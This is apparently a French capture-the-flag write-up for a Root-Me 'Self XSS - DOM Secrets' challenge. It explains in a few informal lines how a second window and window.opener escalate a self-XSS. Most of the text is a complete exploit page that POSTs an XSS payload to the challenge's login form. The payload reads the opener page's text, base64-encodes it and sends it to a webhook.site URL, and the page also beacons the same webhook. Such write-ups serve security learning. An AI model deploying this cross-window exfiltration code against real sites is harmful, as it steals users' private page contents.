# Self XSS - DOM Secrets

Chall de FDP la 

Bon… Je vais juste expliquer le principe 

Si j’envoie le lien avec la xss direct a l’admin, ca va juste changer le secret, donc c’est un truc que seul l’utilisateur peut voir.

Server

Page A					🡺ouvre🡺				Page B

||										||

||										||

V										V

Redirige vers chall/profile				Redirige verslogin(avec payload XSS)  
										||

										||

										V 

							Prend les infos de la Page A

Et ca on peut le faire Car on ouvre Page B avec open() et donc on peut appliquer opener() à page B pour récupérer les infos de la première page, car elle à été créé à partir de A.

Et puis aussi il faut faire attention à attendre un temps précis pour les redirections psq le bot c’est de la merde.

Code Serveur :

<!DOCTYPE html>

<html>

<head><title>Exploit</title></head>

<body>

<script>

    const webhook = "https://webhook.site/c22ae01c-0f6c-4a57-b708-7acbbb1c0777";

    const challengeUrl = "http://challenge01.root-me.org:58003";

    if (!window.opener) {

        fetch("https://webhook.site/c22ae01c-0f6c-4a57-b708-7acbbb1c0777?c=1")

        const page2 = window.open(window.location.href, "page2");

        setTimeout(() => {

            window.location = challengeUrl + "/profile";

        }, 2000);

    } else {

        fetch("https://webhook.site/c22ae01c-0f6c-4a57-b708-7acbbb1c0777?c=2")

        setTimeout(() => {

            const xssPayload = `<img src=x onerror="document.location='${webhook}/?res='+btoa(unescape(encodeURIComponent(opener.document.body.innerText)))">`;

            const form = document.createElement('form');

            form.method = "POST";

            form.action = challengeUrl + "/login";

            const userInp = document.createElement('input');

            userInp.name = "username";

            userInp.value = xssPayload;

            form.appendChild(userInp);

            document.body.appendChild(form);

            form.submit();

        }, 4000);

    }

</script>

</body>

</html>
